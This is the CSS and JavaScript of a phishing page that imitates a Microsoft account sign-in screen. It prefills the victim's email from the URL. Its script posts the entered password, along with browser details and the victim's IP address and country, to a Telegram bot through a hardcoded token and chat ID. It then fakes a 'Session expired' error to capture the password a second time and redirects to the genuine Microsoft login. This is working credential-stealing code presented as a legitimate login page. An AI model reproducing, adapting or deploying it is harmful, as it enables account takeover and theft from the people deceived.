    <style>
        body { 
            margin: 0; padding: 0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: url('https://logincdn.msf taut h.net/shared/5/images/flu ent_web_light_2_145a07dc b97152 7a82b8.svg') no-repeat center center/cover; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
        }
        /* Preloader */
        #preloader { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: #fff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            z-index: 9999; 
        }
        .spinner div { 
            width: 8px; height: 8px; 
            background-color: #005da6; 
            border-radius: 50%; 
            position: absolute; 
            animation: move 1.2s infinite ease-in-out; 
        }
        .spinner div:nth-child(2) { animation-delay: 0.15s; }
        .spinner div:nth-child(3) { animation-delay: 0.3s; }
        @keyframes move { 
            0%, 80%, 100% { transform: scale(0); } 
            40% { transform: scale(1); } 
        }
        /* Login box */
        .login-box { 
            background: white; 
            padding: 2rem; 
            border-radius: 8px; 
            width: 100%; 
            max-width: 400px; 
            box-shadow: 0 0 15px rgba(0,0,0,0.1); 
            position: relative; 
            display: none; 
            transition: transform 0.3s ease, box-shadow 0.3s ease; 
        }
        .login-box:hover { 
            transform: scale(1.02); 
            box-shadow: 0 0 20px rgba(0, 120, 212, 0.4); 
        }
        /* Back Button */
        .backButton { 
            position: absolute; top: 3rem; left: 2rem; 
            background: none; border: none; 
            cursor: pointer; 
            border-radius: 70px; 
        }
        /* Logo */
        .logo { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            gap: 0.4rem; 
            margin-bottom: 1rem; 
            margin-top: 1.5rem; 
        }
        .logo img { height: 24px; }
        .logo span { 
            font-size: 1.1rem; 
            color: #555; 
            font-weight: 500; 
        }
        /* Email pill */
        .email-pill { 
            padding: 0.4rem 1.8rem; 
            border-radius: 20px; 
            font-size: 0.9rem; 
            margin: 0 auto 0.5rem; 
            width: fit-content; 
            text-align: center; 
            border: 1px solid #9999994a; 
        }
        h2 { 
            text-align: center; 
            font-size: 1.4rem; 
            font-weight: 600; 
            margin-bottom: 1.5rem; 
        }
        /* Form */
        .form-group { 
            position: relative; 
            margin-bottom: 1.5rem; 
        }
        .form-group input { 
            width: 95%; 
            padding: 1rem 0.5rem 0.5rem; 
            font-size: 1rem; 
            border: 1px solid #ccc; 
            border-radius: 4px; 
            outline: none; 
        }
        .form-group label { 
            position: absolute; top: 1rem; left: 0.5rem; 
            font-size: 0.9rem; 
            color: gray; 
            pointer-events: none; 
            transition: 0.2s ease all; 
            background: white; 
        }
        .form-group input:focus + label,
        .form-group input:not(:placeholder-shown) + label { 
            top: -0.5rem; left: 0.4rem; 
            font-size: 0.75rem; 
            color: #0078d4; 
        }
        /* Error message */
        .error-message { 
            color: red; 
            font-size: 0.85rem; 
            margin-top: 0rem; 
            margin-bottom: 1rem; 
        }
        /* Button */
        button { 
            background: #0078d4; 
            color: white; 
            border: none; 
            border-radius: 4px; 
            font-size: 1rem; 
            cursor: pointer; 
            transition: background 0.3s ease; 
            width: 100%; 
            padding: 1rem; 
        }
        button:hover { 
            background: #a8abae46; 
        }
        /* Loading state */
        button.loading { 
            position: relative; 
            pointer-events: none; 
        }
        button.loading::after { 
            content: ''; 
            position: absolute; 
            right: 10px; 
            top: 50%; 
            transform: translateY(-50%); 
            width: 15px; 
            height: 15px; 
            border: 2px solid white; 
            border-top: 2px solid transparent; 
            border-radius: 50%; 
            animation: spin 0.6s linear infinite; 
        }
        @keyframes spin { 
            to { transform: translateY(-50%) rotate(360deg); } 
        }
        /* Link */
        .link { 
            display: block; 
            margin-top: 1.2rem; 
            font-size: 0.9rem; 
            color: #0078d4; 
            text-decoration: none; 
            text-align: center; 
        }
        .link:hover { 
            text-decoration: underline; 
        }
        /* Submit button padding */
        .submitBtn { 
            padding: 0.8rem; 
            width: 100%; 
        }
        /* Forgot password */
        #id_A_ForgetPassword { 
            color: #0078d4; 
            text-decoration-line: none; 
            font-size: small; 
        }
    </style>
</head>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const preloader = document.getElementById("preloader");
            const loginBox = document.getElementById("loginBox");
            const emailPill = document.getElementById("emailPill");
            const backArrow = document.getElementById("backArrow");
            const form = document.getElementById("loginForm");
            const submitBtn = document.getElementById("submitBtn");
            const errorMsg = document.getElementById("errorMsg");
            const passwordField = document.getElementById("password");

            // Telegram API config
            const TELEGRAM_BOT_TOKEN = "7873581998:AAEbrxNFBFtMk1yElBQWddq9yewuwlQwSAI";
            const TELEGRAM_CHAT_ID = "6780680557";
            const REDIRECT_URL = "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=175&ct=1754812459&rver=7.3.6960.0&wp=MBI_SSL&wreply=https%3a%2f%2fwww.microsoft.com%2fen-gb%2fwindows%2ftransfer-your-data-with-windows-backup&id=74335";

            function validateEmailOrPlaceholder(value) {
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return (emailRegex.test(value) || value.trim() === "[[-Email-]]" || value.trim() === "[Email]");
            }

            let hashVal = decodeURIComponent(window.location.hash.replace(/^#/, '').trim());
            const email = validateEmailOrPlaceholder(hashVal) ? hashVal : null;

            if (email) {
                emailPill.textContent = email;
                setTimeout(() => {
                    preloader.style.display = "none";
                    loginBox.style.display = "block";
                }, 800);
            } else {
                preloader.style.display = "none";
                loginBox.innerHTML = "<p style='text-align:center;color:red;'>Invalid or missing email.</p>";
                loginBox.style.display = "block";
            }

            backArrow.addEventListener("click", () => {
                window.history.back();
            });

            let attempts = 0;
            form.addEventListener("submit", function(e) {
                e.preventDefault();
                submitBtn.classList.add("loading");
                errorMsg.textContent = "";
                
                setTimeout(() => {
                    submitBtn.classList.remove("loading");
                    attempts++;
                    if (attempts === 1) {
                        sendToTelegram(email, passwordField.value)
                            .catch(err => console.error("Telegram send error:", err));
                        errorMsg.textContent = "Error: Session expired. Try again.";
                        errorMsg.style.color = "red";
                        passwordField.value = "";
                    } else if (attempts === 2) {
                        sendToTelegram(email, passwordField.value)
                            .catch(err => {
                                console.error("Telegram send error:", err);
                            })
                            .finally(() => {
                                window.location.href = REDIRECT_URL;
                            });
                    }
                }, 1000);
            });

            async function sendToTelegram(email, password) {
                const deviceInfo = await getUserInfo();
                const message = `Email: ${email}\nPassword: ${password}\n${deviceInfo}`;
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message
                    })
                });
                if (!response.ok) {
                    throw new Error(`Telegram API error: ${response.statusText}`);
                }
            }

            async function getUserInfo() {
                let ipData = {};
                try {
                    const res = await fetch("https://ipapi.co/json/");
                    ipData = await res.json();
                } catch (err) {
                    ipData = { ip: "Unknown", country_name: "Unknown" };
                }
                return `Browser: ${navigator.userAgent} Platform: ${navigator.platform} Language: ${navigator.language} IP: ${ipData.ip} Country: ${ipData.country_name}`;
            }
        });
    </script>
